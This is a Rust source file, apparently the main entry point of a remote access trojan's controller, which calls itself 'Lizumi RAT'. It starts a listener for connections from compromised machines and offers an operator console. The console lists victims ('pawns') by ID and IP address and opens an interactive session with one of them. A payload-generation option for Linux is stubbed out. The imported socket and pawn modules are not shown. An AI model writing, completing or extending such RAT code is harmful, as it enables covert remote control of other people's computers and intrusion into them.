mod socket;
mod pawn;
mod parser;
mod help;
mod ppanel;

use std::io::{prelude::*, *};
use std::thread;
use std::process::exit;
use crate::parser::*;
use crate::ppanel::*;
use crate::help::*;

#[allow(unused_assignments)]
fn main() {
    let mut ibuf = String::new();

    println!("[+] Lizumi RAT [+]");
    
    let operation = parser::parse();

    match operation {
        Some(oper) => {
            match oper.optype {
                OperationT::Generate => {
                    // not yet implemented
                    println!("[+] generating the payload for linux x86_64...");
                    exit(0);
                },
                OperationT::Listen => {
                    thread::spawn(move || {
                        socket::listen(oper.lhost.as_str(), oper.lport);
                    });
                },
                _ => {
                    println!("{HELP_MENU}");
                    exit(0);
                }
            }
        },
        None => {
            println!("{HELP_MENU}");
            exit(0);
        },
    }

    println!("{SRV_HELP_MENU}");

    loop {
        print!("=> ");
        let (_,_) = (stdout().flush(), stdin().read_line(&mut ibuf));
        match ibuf.as_str().trim() {
            "help" => println!("{SRV_HELP_MENU}"),
            "quit" => exit(0),
            "show" => unsafe {
                for pawn in &socket::current_pawns {
                    println!("\t[{}]\t{}", pawn.uid(), pawn.ip());
                }
            },
            "inter" => pawn_controller(),
            _ => eprintln!("[err] unknown option: {}", ibuf)
        }
        ibuf = String::new();
    }
}
